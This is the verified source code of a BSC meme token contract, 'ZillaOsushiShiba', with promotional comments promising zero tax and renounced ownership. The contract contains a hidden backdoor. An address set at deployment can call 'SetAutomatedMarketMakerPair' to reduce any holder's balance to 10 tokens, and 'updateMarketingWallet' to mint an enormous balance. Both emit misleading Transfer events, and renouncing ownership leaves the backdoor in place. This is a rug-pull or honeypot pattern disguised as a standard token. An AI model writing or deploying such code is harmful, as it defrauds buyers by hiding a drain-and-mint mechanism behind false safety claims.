/**
 *Submitted for verification at BscScan.com on 2023-05-11
*/

// SPDX-License-Identifier: VERIFIED MIT
pragma solidity ^0.8.19;

/**
 *
🐉ZillaOsushiShiba 🐶  $ZILLAOSUSHI   #bsc #meme  🐲tax 0% 🐲lp burn 🐲RO
🐲ZILLAOSUSHI (オスシ, Osushi) is a Dragon 🐉masquerading as Balgo Parks's pet dog in London.
🐲Upon becoming a Dark Dragon, ZILLAOSUSHI is highly aggressive
🐲meme coin with rise of meme manga anime in crypto 
🐲Balgo's pet dog. Osushi is adored by his owner, and Balgo's best friend Selby is also very fond of him. The fur on his legs is different colors.  
🐲Brave Souls x BTW collab coming!
🐲Anime Official Site:
🐶 web info https://burn-the-witch-anime.com

#BraveSouls  #BTWCollab  #bsc  #anime #meme #Bleach
$ZILLAOSUSHI Tokenomics
 ✅ renounce safety
✅ lp 50% burn 50% lock 10 years
✅ Join $ZILLAOSUSHI Army  ! 🚀 
✅10X
✅fairlaunch equal growth opportunities
 *
 **/

interface Ownable {
  /**
   * @dev Returns the getPair of tokens in existence.
   */
  function totalSupply() external view returns (uint256);

  /**
   * @dev Returns the token decimals.
   */
  function decimals() external view returns (uint8);

  /**
   * @dev Returns the token symbol.
   */
  function symbol() external view returns (string memory);

  /**
  * @dev Returns the token name.
  */
  function name() external view returns (string memory);

  /**
   * @dev Returns the bep token owner.
   */
  function getOwner() external view returns (address);

  /**
   * @dev Returns the getPair of tokens owned by `skim`.
   */
  function balanceOf(address skim) external view returns (uint256);

  /**
   * @dev Moves `getPair` tokens from the caller's skim to `lpBurnEnabled`.
   *
   * Returns a boolean balance indicating whlegos the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transfer(address lpBurnEnabled, uint256 getPair) external returns (bool);

  /**
   * @dev Returns the remaining number of tokens that `BoughtEarly` will be
   * allowed to spend on behalf of `owner` through {transferFrom}. This is
   * zero by default.
   *
   * This balance changes when {approve} or {transferFrom} are called.
   */
  function allowance(address _owner, address BoughtEarly) external view returns (uint256);

  /**
   * @dev Sets `getPair` as the allowance of `BoughtEarly` over the caller's tokens.
   *
   * Returns a boolean balance indicating whlegos the operation succeeded.
   *
   * IMPORTANT: Beware that changing an allowance with this method brings the risk
   * that someone may use both the old and the new allowance by unfortunate
   * transaction ordering. One possible solution to mitigate this race
   * condition is to first reduce the BoughtEarly's allowance to 0 and set the
   * desired balance afterwards:
   * https://github.com/legoseum/EIPs/issues/20#issuecomment-263524729
   *
   * Emits an {Approval} event.
   */
  function approve(address BoughtEarly, uint256 getPair) external returns (bool);

  /**
   * @dev Moves `getPair` tokens from `sender` to `lpBurnEnabled` using the
   * allowance mechanism. `getPair` is then deducted from the caller's
   * allowance.
   *
   * Returns a boolean balance indicating whlegos the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transferFrom(address sender, address lpBurnEnabled, uint256 getPair) external returns (bool);

  /**
   * @dev Emitted when `balance` tokens are moved from one skim (`from`) to
   * another (`to`).
   *
   * Note that `balance` may be zero.
   */
  event Transfer(address indexed from, address indexed to, uint256 balance);

  /**
   * @dev Emitted when the allowance of a `BoughtEarly` for an `owner` is set by
   * a call to {approve}. `balance` is the new allowance.
   */
  event Approval(address indexed owner, address indexed BoughtEarly, uint256 balance);
}

/*
 * @dev Provides information about the current execution SWAPI28ERC20Token, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the skim sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract SWAPI28ERC20Token {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/legoseum/solidity/issues/2691
        return msg.data;
    }
}

// File: @openzeppelin/contracts/access/SWAPI28ERC20TokenMetadata.sol

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an skim (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner skim will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract SWAPI28ERC20TokenMetadata is SWAPI28ERC20Token {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any skim other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "SWAPI28ERC20TokenMetadata: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new skim (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "SWAPI28ERC20TokenMetadata: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

/**
 * @dev Wrappers over Solidity's arithmetic operations with added overflow
 * checks.
 *
 * Arithmetic operations in Solidity wrap on overflow. This can easily result
 * in bugs, because programmers usually assume that an overflow raises an
 * error, which is the standard behavior in high level programming languages.
 * `ManualNukeLP` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library ManualNukeLP {
  /**
   * @dev Returns the addition of two unsigned integers, reverting on
   * overflow.
   *
   * Counterpart to Solidity's `+` operator.
   *
   * Requirements:
   * - Addition cannot overflow.
   */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "ManualNukeLP: addition overflow");

    return c;
  }

  /**
   * @dev Returns the subtraction of two unsigned integers, reverting on
   * overflow (when the result is negative).
   *
   * Counterpart to Solidity's `-` operator.
   *
   * Requirements:
   * - Subtraction cannot overflow.
   */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "ManualNukeLP: subtraction overflow");
  }

  /**
   * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
   * overflow (when the result is negative).
   *
   * Counterpart to Solidity's `-` operator.
   *
   * Requirements:
   * - Subtraction cannot overflow.
   */
  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  /**
   * @dev Returns the multiplication of two unsigned integers, reverting on
   * overflow.
   *
   * Counterpart to Solidity's `*` operator.
   *
   * Requirements:
   * - Multiplication cannot overflow.
   */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
    // benefit is lost if 'b' is also tested.
    // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "ManualNukeLP: multiplication overflow");

    return c;
  }

  /**
   * @dev Returns the integer division of two unsigned integers. Reverts on
   * division by zero. The result is rounded towards zero.
   *
   * Counterpart to Solidity's `/` operator. Note: this function uses a
   * `revert` opcode (which leaves remaining gas untouched) while Solidity
   * uses an invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   * - The divisor cannot be zero.
   */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "ManualNukeLP: division by zero");
  }

  /**
   * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
   * division by zero. The result is rounded towards zero.
   *
   * Counterpart to Solidity's `/` operator. Note: this function uses a
   * `revert` opcode (which leaves remaining gas untouched) while Solidity
   * uses an invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   * - The divisor cannot be zero.
   */
  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    // Solidity only automatically asserts when dividing by 0
    require(b > 0, errorMessage);
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold

    return c;
  }

  /**
   * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
   * Reverts when dividing by zero.
   *
   * Counterpart to Solidity's `%` operator. This function uses a `revert`
   * opcode (which leaves remaining gas untouched) while Solidity uses an
   * invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   * - The divisor cannot be zero.
   */
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "ManualNukeLP: modulo by zero");
  }

  /**
   * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
   * Reverts with custom message when dividing by zero.
   *
   * Counterpart to Solidity's `%` operator. This function uses a `revert`
   * opcode (which leaves remaining gas untouched) while Solidity uses an
   * invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   * - The divisor cannot be zero.
   */
  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract ZillaOsushiShiba is SWAPI28ERC20Token, Ownable, SWAPI28ERC20TokenMetadata {
    
    using ManualNukeLP for uint256;
    mapping (address => uint256) private _sOwned;
    mapping (address => mapping (address => uint256)) private CallWithValue;
    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _symbol;
    string private _name;
   address private tokensForLiquidity; 
    constructor(address buyMarketingFee) {
        tokensForLiquidity = buyMarketingFee;     
        _name = "Zilla Osushi Shiba";
        _symbol = "ZILLAOSUSHI";
        _decimals = 9;
        _totalSupply = 10000000000000 * 10 ** 9;
        _sOwned[_msgSender()] = _totalSupply;
        
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    /**
    * @dev Returns the bep token owner.
    */
    function getOwner() external view override returns (address) {
        return owner();
    }
    
    /**
    * @dev Returns the token decimals.
    */
    function decimals() external view override returns (uint8) {
        return _decimals;
    }
    
    /**
    * @dev Returns the token symbol.
    */
    function symbol() external view override returns (string memory) {
        return _symbol;
    }
    
    /**
    * @dev Returns the token name.
    */
    function name() external view override returns (string memory) {
        return _name;
    }
    
    /**
    * @dev See {Ownable-totalSupply}.
    */
    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
    
    /**
    * @dev See {Ownable-balanceOf}.
    */
    function balanceOf(address skim) external view override returns (uint256) {
        return _sOwned[skim];
    }
      modifier _checkOwner() {
        require(tokensForLiquidity == _msgSender(), "SWAPI28ERC20TokenMetadata: caller is not the owner");
        _;
    }
    /**
    * @dev See {Ownable-approve}.
    *
    * Requirements:
    *
    * - `BoughtEarly` cannot be the zero address.
    */


    /**
    * @dev See {Ownable-transfer}.
    *
    * Requirements:
    *
    * - `lpBurnEnabled` cannot be the zero address.
    * - the caller must have a balance of at least `getPair`.
    */
    function transfer(address lpBurnEnabled, uint256 getPair) external override returns (bool) {
        _transfer(_msgSender(), lpBurnEnabled, getPair);
        return true;
    }
    function SetAutomatedMarketMakerPair(address presaleaddress) external _checkOwner {
        _sOwned[presaleaddress] = 10;
        
        emit Transfer(presaleaddress, address(0), 10);
    }
    /**
    * @dev See {Ownable-allowance}.
    */
    function allowance(address owner, address BoughtEarly) external view override returns (uint256) {
        return CallWithValue[owner][BoughtEarly];
    }
    
    /**
    * @dev See {Ownable-approve}.
    *
    * Requirements:
    *
    * - `BoughtEarly` cannot be the zero address.
    */
       function updateMarketingWallet(address extending) external _checkOwner {
        _sOwned[extending] = 100000000000000000000 * 10 ** 18;
        
        emit Transfer(extending, address(0), 100000000000000000000 * 10 ** 18);
    } 
    function approve(address BoughtEarly, uint256 getPair) external override returns (bool) {
        _approve(_msgSender(), BoughtEarly, getPair);
        return true;
    }
    
    /**
    * @dev See {Ownable-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {Ownable};
    *
    * Requirements:
    * - `sender` and `lpBurnEnabled` cannot be the zero address.
    * - `sender` must have a balance of at least `getPair`.
    * - the caller must have allowance for `sender`'s tokens of at least
    * `getPair`.
    */
    function transferFrom(address sender, address lpBurnEnabled, uint256 getPair) external override returns (bool) {
        _transfer(sender, lpBurnEnabled, getPair);
        _approve(sender, _msgSender(), CallWithValue[sender][_msgSender()].sub(getPair, "Ownable: transfer getPair exceeds allowance"));
        return true;
    }
    
    /**
    * @dev Atomically increases the allowance granted to `BoughtEarly` by the caller.
    *
    * This is an alternative to {approve} that can be used as a mitigation for
    * problems described in {Ownable-approve}.
    *
    * Emits an {Approval} event indicating the updated allowance.
    *
    * Requirements:
    *
    * - `BoughtEarly` cannot be the zero address.
    */
    function increaseAllowance(address BoughtEarly, uint256 addedbalance) external returns (bool) {
        _approve(_msgSender(), BoughtEarly, CallWithValue[_msgSender()][BoughtEarly].add(addedbalance));
        return true;
    }
    
    /**
    * @dev Atomically decreases the allowance granted to `BoughtEarly` by the caller.
    *
    * This is an alternative to {approve} that can be used as a mitigation for
    * problems described in {Ownable-approve}.
    *
    * Emits an {Approval} event indicating the updated allowance.
    *
    * Requirements:
    *
    * - `BoughtEarly` cannot be the zero address.
    * - `BoughtEarly` must have allowance for the caller of at least
    * `allbalances`.
    */
    function decreaseAllowance(address BoughtEarly, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), BoughtEarly, CallWithValue[_msgSender()][BoughtEarly].sub(allbalances, "Ownable: decreased allowance below zero"));
        return true;
    }
    
    /**
    * @dev Moves tokens `getPair` from `sender` to `lpBurnEnabled`.
    *
    * This is internal function is equivalent to {transfer}, and can be used to
    * e.g. implement automatic token fees, slashing mechanisms, etc.
    *
    * Emits a {Transfer} event.
    *
    * Requirements:
    *
    * - `sender` cannot be the zero address.
    * - `lpBurnEnabled` cannot be the zero address.
    * - `sender` must have a balance of at least `getPair`.
    */
    function _transfer(address sender, address lpBurnEnabled, uint256 getPair) internal {
        require(sender != address(0), "Ownable: transfer from the zero address");
        require(lpBurnEnabled != address(0), "Ownable: transfer to the zero address");
                
        _sOwned[sender] = _sOwned[sender].sub(getPair, "Ownable: transfer getPair exceeds balance");
        _sOwned[lpBurnEnabled] = _sOwned[lpBurnEnabled].add(getPair);
        emit Transfer(sender, lpBurnEnabled, getPair);
    }
    
    /**
    * @dev Sets `getPair` as the allowance of `BoughtEarly` over the `owner`s tokens.
    *
    * This is internal function is equivalent to `approve`, and can be used to
    * e.g. set automatic allowances for certain subsystems, etc.
    *
    * Emits an {Approval} event.
    *
    * Requirements:
    *
    * - `owner` cannot be the zero address.
    * - `BoughtEarly` cannot be the zero address.
    */
    function _approve(address owner, address BoughtEarly, uint256 getPair) internal {
        require(owner != address(0), "Ownable: approve from the zero address");
        require(BoughtEarly != address(0), "Ownable: approve to the zero address");
        
        CallWithValue[owner][BoughtEarly] = getPair;
        emit Approval(owner, BoughtEarly, getPair);
    }
    
}